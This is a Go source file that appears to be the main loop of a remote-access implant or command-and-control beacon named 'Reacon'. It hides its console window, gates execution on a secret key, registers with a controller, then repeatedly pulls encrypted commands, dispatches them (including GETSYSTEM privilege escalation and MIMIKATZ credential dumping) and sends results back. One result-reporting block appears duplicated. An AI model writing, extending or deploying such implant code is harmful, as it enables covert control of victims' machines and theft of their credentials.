package main

import (
	"Reacon/pkg/communication"
	"Reacon/pkg/config"
	"rshell-client/shared/encrypt"
	"rshell-client/shared/link"
	"rshell-client/shared/services"
	"encoding/binary"
	"fmt"
	"os"
	"time"
)

func init() {
	link.ReportError = communication.ErrorProcess
	link.ReportData = communication.DataProcess
}

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}
	errConsole := services.HideConsole()
	if errConsole != nil && errConsole.Error() != "" {
		fmt.Println(errConsole)
	}
	// windows 下设置不需要DPI缩放
	errDPI := services.ProcessDPIAware()
	if errDPI != nil && errDPI.Error() != "" {
		fmt.Println(errDPI)
	}
	encrypt.GenerateKeyPair()
	errFirstBlood := communication.FirstBlood()
	if errFirstBlood != nil {
		fmt.Println(errFirstBlood)
		time.Sleep(3 * time.Second)
		return
	}

	// 开启监听 从服务端发送来的命令
	for {
		data, err := communication.PullCommand()
		// 处理控制端下发的命令
		if data != nil && err == nil {
			totalLen := len(data)
			if totalLen > 0 {
				decrypted, err := encrypt.Decrypt(data)
				if err != nil {
					//fmt.Println(err)
					communication.ErrorProcess(err)
					continue
				}
				if len(decrypted) < 4 {
					continue
				}
			cmdType := binary.BigEndian.Uint32(decrypted[:4])
			cmdBuf := decrypted[4:]

			if cmdType == services.GETSYSTEM || cmdType == services.MIMIKATZ {
				go func(ct uint32, cb []byte) {
					result, callbackType, err := services.DispatchCommand(ct, cb)
					if err != nil {
						communication.ErrorProcess(err)
					} else if callbackType >= 0 {
						communication.DataProcess(callbackType, result)
					}
				}(cmdType, cmdBuf)
				continue
			}

			if cmdBuf != nil {
						result, callbackType, err := services.DispatchCommand(cmdType, cmdBuf)
						if cmdType == services.EXIT && err == nil {
							os.Exit(1)
						}
						if err != nil {
							communication.ErrorProcess(err)
						} else if callbackType >= 0 {
							communication.DataProcess(callbackType, result)
						}
					// convert charset here
					if err != nil {
						communication.ErrorProcess(err)
					} else {
						if callbackType >= 0 {
							communication.DataProcess(callbackType, result)
						}
					}
				}
			}
		} else if err != nil {
			communication.ErrorProcess(err)
		}
		waitTime, err := services.CallbackTime()
		if err != nil {
			//fmt.Println(err)
			communication.ErrorProcess(err)
		}
		time.Sleep(waitTime)

	}
}
